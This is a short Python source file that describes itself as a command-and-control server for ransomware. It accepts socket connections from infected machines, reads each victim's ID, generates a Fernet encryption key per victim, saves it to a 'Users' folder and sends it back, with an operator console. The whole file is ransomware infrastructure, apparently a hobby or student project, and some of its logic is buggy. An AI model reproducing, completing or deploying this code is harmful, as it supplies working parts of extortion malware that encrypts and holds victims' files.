"""
C&C server for communication with the ransomware on local machine
"""
import socket, select
import sys
from threading import Thread
from cryptography.fernet import Fernet
import os


class ClientThread(Thread):

    def __init__(self, host: str, port: int, conn: socket) -> None:
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.conn = conn
        self.id = None

    def run(self) -> None:
        while True:
            
            data = self.conn.recv(2048)

            if self.id == None:
                self.id = data

            if not data: break
            
            print(f"recieved user connectinon: {data}")


class Server():
    def __init__(self, host: str, port: int) -> None:
        self.ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ss.bind((host, port))
        self.ss.listen(10)
        self.host = host
        self.port = port
        self.threads = {}
        self.inp = ''
        self.Users = os.scandir("Users")

    def keyGen(self, id: str) -> bytes:
        key = Fernet.generate_key()
        with open(os.path.join("Users", id), 'wb') as gotUser:
            gotUser.write(key)
        return key

    def thread_check(self, new_thread: ClientThread) -> None:
        print(new_thread.id)
        print(self.Users)
        for t in self.Users:
            print(t)
            if new_thread.id == t:
                new_thread.conn.send(b"wait")
                return
        
        new_thread.conn.send(self.keyGen(new_thread.id))
    
    def start(self) -> None:
        r_socks, w_socks, e_socks = select.select([self.ss], [], [])
        while True:
            for sock in r_socks:
                (conn, (self.host, self.port)) = self.ss.accept()
                new_thread = ClientThread(self.host, self.port, conn)
                new_thread.start()

                if new_thread.id == None:
                    print("bad")
                    continue
                
                userId = new_thread.id.decode("Utf-8")
                print(userId)
                self.thread_check(new_thread)
                self.threads[new_thread.id] = new_thread

    def inputThread(self) -> str:
        while 1:
            self.inp = input(">: ")
            print(self.inp)
            if self.inp == "kill":
                return

    def inputLoop(self) -> None:
        
        inputThread = Thread(target=self.inputThread)
        inputThread.start()

        self.start()

        inputThread.join()
        





if __name__ == "__main__":

    s = Server("127.0.0.1", 5789)
    s.inputLoop()

    sys.exit()
